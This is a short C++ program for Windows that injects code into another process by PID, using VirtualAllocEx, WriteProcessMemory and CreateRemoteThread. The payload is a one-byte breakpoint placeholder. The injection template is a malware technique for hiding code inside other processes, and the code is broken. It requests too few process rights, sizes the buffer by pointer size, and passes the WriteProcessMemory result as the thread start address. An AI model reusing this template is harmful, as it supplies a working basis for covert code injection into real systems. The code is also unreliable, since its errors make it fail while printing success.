//executing in other process using CreateRemoteThread

#include<iostream>
#include<windows.h>

using namespace std;

int main(int argc, char *argv[]){

	if(argc != 2){
		cout<<"Usage: <PID> "<<endl;
		exit(-1);
	}

    HANDLE target_process, remote_thread;
	LPVOID alloc;
	BOOL write_proc;
	char *shellcode = "\xcc";

	//get handle to process
	target_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, DWORD(atoi(argv[1])));
	if(target_process == NULL){
		cout<<"Error setting handle to process"<<endl;
		return 1;
	}

	//allocate memory for shellcode
	alloc = VirtualAllocEx(target_process, NULL, sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(alloc == NULL){
		cout<<"Error allocating memory in remote process"<<endl;
		return 1;
	}

	//write shellcode to memory
	write_proc = WriteProcessMemory(target_process, alloc, shellcode, sizeof(shellcode), NULL);
	
	//execute shellcode using new remote thread
	remote_thread = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) write_proc, NULL, 0, NULL);
	if(remote_thread == NULL){
		cout<<"Error creating remote thread"<<endl;
		return 1;
	}

	cout<<"Success!!!"<<endl;
	CloseHandle(target_process);
	return 0;

}

